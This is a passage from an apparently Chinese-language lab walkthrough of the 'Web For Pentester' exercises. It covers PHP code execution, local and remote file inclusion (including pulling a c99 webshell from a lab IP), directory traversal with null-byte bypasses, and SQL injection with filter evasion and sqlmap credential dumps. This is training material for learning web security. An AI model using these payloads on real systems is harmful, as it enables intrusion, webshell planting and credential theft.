<pre><code>?new=phpinfo()&amp;pattern=/lamer/e&amp;base=...
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
<h4 id="3-4"><a href="#3-4" class="headerlink" title="3.4"></a>3.4</h4><p>还可以使用system()函数执行任意命令，查看passwd系统文件或者ls命令</p>
<pre><code>?new=system(&#39;pwd&#39;)&amp;pattern=/lamer/e&amp;base=...
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-4-1.png" alt="3-4-1"></p>
<pre><code>?new=system(&#39;ls&#39;)&amp;pattern=/lamer/e&amp;base=...
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-4-2.png" alt="3-4-2"></p>
<p>四、Example 4</p>
<p>4.1 源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4-1.png" alt="4-1"></p>
<p>4.2 报错信息</p>
<p>在URL后面添加一个单引号，从报错信息可知代码中使用了assert()函数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4-2.png" alt="4-2"></p>
<p>4.3 </p>
<pre><code>?name=hacker&#39;.phpinfo().&#39;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4-3.png" alt="4-3"></p>
<hr>
<h1 id="（五）文件包含"><a href="#（五）文件包含" class="headerlink" title="（五）文件包含"></a>（五）文件包含</h1><h2 id="【原理】-4"><a href="#【原理】-4" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）在很多web应用中，开发者需要在多重页面中通过包含文件来载入基础类或者共享一些模板</p>
<p>（2）文件包含漏洞是因为在用户控制的变量作为文件名的一部分被传入文件包含函数（PHP中有require、require_once、include or include_once等函数）时没有进行严格的过滤。一旦文件传入的方式存在漏洞，攻击者就可能操纵函数加载自己的代码。文件包含漏洞也可以被用来遍历读取任意文件。但是，如果有任意的代码包含开放的PHP标签，这个文件会被作为PHP代码来执行</p>
<p>（3）文件包含函数可以允许载入本地资源或者远程资源（比如一个web网站）。如果漏洞存在，他将导致：</p>
<p>（4）本地文件包含：简称LFI，可以读取和执行本地文件</p>
<p>（5）远程文件包含：简称RFI，可以获取和执行远程文件</p>
<p>（6）默认情况下，PHP禁止载入远程文件，关联的配置选项是allow_url_included。在ISO中，这个选项被设置为允许能让你测试RFI漏洞</p>
<h2 id="【步骤】-4"><a href="#【步骤】-4" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
<p>1.1 源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
<p>1.2 输入代码</p>
<p>在URL后随便添加一个特殊字符（比如单引号），会返回一个错误消息，由错误消息可以准确得到几条信息</p>
<p>一是这个脚本的路径是/var/www/fileincl/example1.php，二是这个函数用了include()，三是include()函数包含的文件是intro.php，且没有多余的东西或有过滤机制</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
<p>1.3 获取passwd</p>
<pre><code>?page=../../../../etc/passwd
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
<p>1.4 远程包含</p>
<pre><code>?page=http://192.168.1.11/c99.txt
</code></pre><p>远程包含c99.txt，此时就直接拿到webshell，可以对网站进行一系列渗透操作</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-4.png" alt="1-4"></p>
<p>二、Example 2 </p>
<p>2.1 源代码</p>
<p>由源代码可以看出来，代码中限制了包含的文件后缀为.php。这个例子中，php程序会在提供的文件值添加自己的后缀，也和先前的处理方法雷士，你可以在LFI中用NULL类型值来摆脱后缀带来的困扰。针对RFI，你还可以通过添加&amp;blah= 或者?blah= 绕过后缀问题，这要取决于你遇到的URL形式。在这个示例中，代码模拟的是旧版本的PHP行为。新版本（5.3.4开始）已经纠正了路径处理问题，并且不会受NULL类型值的影响</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
<p>2.2 输入代码</p>
<pre><code>?page=../../../../etc/passwd
</code></pre><p>在本例中想再次获取passwd代码时，已经出错了，可以看到添加了后缀.php</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>2.3 %00</p>
<pre><code>?page=../../../../etc/passwd%00
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
<p>2.4 远程包含</p>
<pre><code>?pagee=http://192.168.1.111/c99.txt%00
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
<hr>
<h1 id="（六）目录遍历"><a href="#（六）目录遍历" class="headerlink" title="（六）目录遍历"></a>（六）目录遍历</h1><h2 id="【原理】-5"><a href="#【原理】-5" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）目录遍历漏洞是因为web应用对路径部分没有过滤或者编码。在一个遍历漏洞中，可以使用”相同值技术”来测试是否存在问题。举个例子，如果一个参数的路径是/images/photo.jpg。你可以尝试以下这个路径：</p>
<pre><code>/images/./photo.jpg   可以看到同样的页面
/images/../photo.jpg   看懂一个错误页面
/images/../images/photo.jpg   再次看到同样的页面
/images/../IMAGES/photo.jpg   出现一个一个错误（视文件系统而定）或者发生一些古怪的事情
</code></pre><p>（2）如果没看到image这个路径参数，这个合法的路径直接是photo.jpg，你需要找出它的父目录是什么</p>
<p>（3）在测试中，你可以尝试检索其他文件。在Linux/Unix中最常用的测试文件是/etc/passwd。你可以这样尝试：</p>
<pre><code>images/../../../../../../../../../../../../etc/passwd
</code></pre><p>（4）如果你能看到passwd文件的内容，说明web应用是存在漏洞的。这个方法的好处是你不用知道需要放几个<strong>../</strong>，如果你放了很多一样能奏效</p>
<p>（5）另一件有趣的事情是，如果在windows下你有个目录遍历漏洞，你可以打开test/../../../file.txt这样的路径，即使test这个目录不存在。但在linux就行不通。当遇到代码结合用户输入的数据来创建文件名的时候这是很有用的漏洞。举个例子，下面的php代码时设计为添加id变量来创建文件名的（比如example1.txt）。在Linux下，如果不存在以example_开头的目录，就无法利用这个漏洞，然而在windows下，即使不存在这样的目录，也能成功利用这个漏洞</p>
<pre><code>$file = &quot;/var/files/example_&quot;.$_GET[&#39;id&#39;]&quot;.&quot;txt&quot;；
</code></pre><h2 id="【步骤】-5"><a href="#【步骤】-5" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
<p>1.1 源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-1-2.png" alt="1-1-2"></p>
<p>1.2 输入代码</p>
<pre><code>?file=../../../../../../etc/passwd
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
<p>查看源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-2-2.png" alt="1-2-2"></p>
<p>二、Example 2</p>
<p>2.1 源代码</p>
<p>这个代码加上了简单的路径检查，直接输入路径是看不到东西，但是可以绕过去</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-1-2.png" alt="2-1-2"></p>
<p>2.2 输入代码</p>
<pre><code>?file=../../../../../etc/passwd
</code></pre><p>返回一片空白</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>2.3 修改绕过</p>
<pre><code>?file=/var/www/files/../../../../../etc/passwd
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
<p>三、Example 3</p>
<p>3.1 源代码</p>
<p>在这个代码中，当你尝试遍历目录时，服务端代码会在你的代码后面添加自己的后缀。这时候用NULL字符（url编码为%00）很容易绕过去。用空值摆脱服务器端添加的后缀通常是绕过方法，这在perl和旧版本的PHP能达到很好的效果。PHP从5.3.4开始解决了这个安全漏洞</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/3-1-2.png" alt="3-1-2"></p>
<p>3.2 输入代码</p>
<pre><code>?file=../../../../../etc/passwd
</code></pre><p>同样得不到任何东西</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>3.3 修改一下</p>
<pre><code>?file=../../../../../etc/passwd%00
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
<hr>
<h1 id="（七）SQL注入"><a href="#（七）SQL注入" class="headerlink" title="（七）SQL注入"></a>（七）SQL注入</h1><h2 id="【原理】-6"><a href="#【原理】-6" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）SQL注入是最常见的web漏洞之一。这里所有的SQL注入漏洞练习都是用Mysql当做数据库。SQL注入是由于程序做SQL查询的时候缺乏编码或者转义用户的输入造成的。由于SQL查询语句信息添加方式不同，需要用不同的语句来完成SQL注入，如使用引号（单引号或者双引号）、用反引号，以及直接添加值</p>
<p>（2）通过9个SQL注入实例的练习，可以学到：</p>
<ul>
<li>SQL躲避filter的各种方法，如使用HTML Encode、/<em> </em>/注释、正则表达式、order by等方法进行filter</li>
<li>insert、update、delete statement的注入方式</li>
<li>Prepared Statement的防注入</li>
</ul>
<h2 id="【步骤】-6"><a href="#【步骤】-6" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
<p>1.1 源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
<p>1.2 环境内容</p>
<p>可以看到参数是一个字符串root，并且看到表中有一行数据</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
<p>1.3 尝试</p>
<p>在不知道服务器端代码的情况下，为了了解，我们随便输入一些参数进行测试</p>
<p>（1）在root参数后面添加一些多余的字符，结果返回的表中没有任何数据，可以猜测服务器端用到了我们提交的数据，并且对数据做了某些匹配，因为没有匹配的数据，所有没有数据返回</p>
<pre><code>?name=root123
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-1.png" alt="1-3-1"></p>
<p>（2）在root后面添加空格，却可以返回数据，因为Mysql默认情况下作比较操作的时候会忽略掉空格（+号代表空格）</p>
<pre><code>?name=root+++
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-2.png" alt="1-3-2"></p>
<p>（3）添加双引号，同样没有数据返回</p>
<pre><code>?name=root&quot;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-3.png" alt="1-3-3"></p>
<p>（4）添加单引号时，整个表格直接是消失了，说明我们可能破坏了一些东西。由测试，我们可以推断出SQL查询语句有可能是这样的：</p>
<pre><code>SELECT * FROM users WHERE name=&#39;[INPUT]&#39;;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-4.png" alt="1-3-4"></p>
<p>1.4 对猜测结果测试</p>
<p>（1）加上#号（url编码为%23），原先的查询语句中单引号会被#号注释掉</p>
<pre><code>?name=root&#39;%23
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-4-1.png" alt="1-4-1"></p>
<p>（2）加上and 1=1，得到和root一样的数据</p>
<pre><code>?name=root&#39; and 1=1 %23
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-4-2.png" alt="1-4-2"></p>
<p>（3）加上and 1=2，没有数据可以放回</p>
<pre><code>?name=root&#39; and 1=2
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-4-3.png" alt="1-4-3"></p>
<p>1.5  利用注入点进行注入</p>
<p>既然上面的猜测成立了，那么我们就可以利用注入点进行SQL注入</p>
<p>（1）利用sqlmap。注意：命令行中切换到sqlmap的目录下在执行以下命令</p>
<pre><code>sqlmap.py -u &quot;http://...?name=root&quot;
</code></pre><p>这条命令可以获得目标操作系统的：操作系统版本、服务器使用的PHP和Apache版本、数据库版本</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-1.png" alt="1-5-1"></p>
<p>（2）查看拥有的数据库</p>
<pre><code>sqlmap.py -u &quot;http://...?name=root&quot; --dbs
</code></pre><p>可以获得目标所拥有的所有数据库。ps：因为information_schema是默认存在的，所以我们可以确定当前使用的数据库就是另外一个：exercises，不用再通过–current-db来获取当前数据库</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-2.png" alt="1-5-2"></p>
<p>（3）获取某个数据库拥有的表</p>
<pre><code>sqlmap.py -u &quot;http://...?name=root&quot; --tables -D &quot;exercises&quot;
</code></pre><p>从结果可以看出来，数据库中只有一个users表</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-3.png" alt="1-5-3"></p>
<p>（4）获取某个表的所有字段</p>
<pre><code>sqlmap.py -u &quot;http://...?name=root&quot; --columns -D &quot;exercises&quot;
</code></pre><p>因为只有一张表，所有可以直接不用-T来指定哪个表，不然要使用-T</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-4.png" alt="1-5-4"></p>
<p>（5）获取某个字段的指定内容</p>
<pre><code>sqlmap.py -u &quot;http://...?name=root&quot; --dump -C &quot;name.passwd&quot; -D &quot;exercises&quot;
</code></pre><p>使用–dump获取由-C执行的字段值，结果得到5个账号的用户名和密码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-5.png" alt="1-5-5"></p>
<p>二、Example 2</p>
<p>2.1 源代码</p>
<p>这个源代码中添加了对空格的过滤，并会报错：”ERROER NO SPACE”</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-1-1.png" alt="2-1-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-1-2.png" alt="2-1-2"></p>
<p>2.2 输入代码</p>
<pre><code>?name=root&#39; and 1=1 %23
</code></pre><p>此时就报错了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>2.3 空格的绕过方法</p>
<p>Mysql SQL注入绕过空格过滤的方法有几种方法：</p>
<pre><code>① 对水平制表tab(HT或者\t)进行url编码，即用%09代替空格

② 使用注释绕过空格，即使用/**/代替空格

③ 使用括号绕过空格
</code></pre><p>（1）使用%09代替空格</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-3-1.png" alt="2-3-1"></p>
<p>（2）and%091=2时，不返回数据</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-3-2.png" alt="2-3-2"></p>
<p>（3）使用/**/代替空格</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-3-3.png" alt="2-3-3"></p>
<p>2.4 找到注入点后就可以注入</p>
<pre><code>?name=root&#39;/**/union/**/select/**/*/**/from/**/users%23
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
<p>三、Example 3</p>
<p>3.1 源代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-1-1.png" alt="3-1-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-1-2.png" alt="3-1-2"></p>
<p>3.2 \s过滤掉了空格和tab符号</p>
<p>\s过滤了空格和tab符号，所以不能用%09代替空格了，否者会报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
<p>3.3 但是还是可以使用/**/代替空格</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
<p>四、Example 4</p>
<p>4.1 源代码</p>
<p>源码可以看出，代码中使用了mysql_real_escape_string()函数过滤了string，但是也仅仅只过滤了string</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-1-1.png" alt="4-1-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-1-2.png" alt="4-1-2"></p>
<p>4.2 mysql_real_escape_string()函数</p>
<p>mysql_real_escape_string()函数转义SQL语句中使用的字符串中的特殊字符。受影响的字符包括：</p>
<pre><code>\x00、\n、\r、\、&#39;、&quot;和\x1a
</code></pre><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false函数原型为mysql_real_escape_string(string,connection)</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-2.png" alt="4-2"></p>
<p>4.3 </p>
<pre><code>?id=2 and 1=1
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-3.png" alt="4-3"></p>
<p>4.4 </p>
<pre><code>?id=2 and 1=2
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-4.png" alt="4-4"></p>
<p>4.5 数值型注入</p>
<p>由4.3和4.4的测试知道，此SQL注入属于数值型的输入。由于过滤了单引号等， 对数值型注入其实没有意义，可以直接注入</p>
<pre><code>?id=2 union select * from users
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4-5.png" alt="4-5"></p>
<p>五、Example 5</p>
<p>5.1 源代码</p>
<p>可以看出，代码中使用了一个正则表达式来预防SQL注入，不过，这个正则表达式没有用对，因为代码只确保了id参数是以一个数字开头，即只要首字母为数字，则能避过正则表达式的过滤</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-1-1.png" alt="5-1-1"></p>
<p>5.2 </p>
<pre><code>?id=2 and 1=1
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-2.png" alt="5-2"></p>
<p>5.3 </p>
<pre><code>?id=2 and 1=2
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-3.png" alt="5-3"></p>
<p>5.4</p>
<pre><code>?id=2 union select user(),2,3,4,5 %23
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5-4.png" alt="5-4"></p>
<p>六、Example 6</p>
<p>6.1 源代码</p>
<p>这个正则表达式也没有用对，因为代码只确保了id参数是以一个数字结尾，不能确保id参数的开头是合法的，即只要尾字母为数字，则能避过正则表达式的过滤</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-1.png" alt="6-1"></p>
<p>6.2 </p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-2.png" alt="6-2"></p>
<p>6.3</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6-3.png" alt="6-3"></p>
<p>6.4 </p>
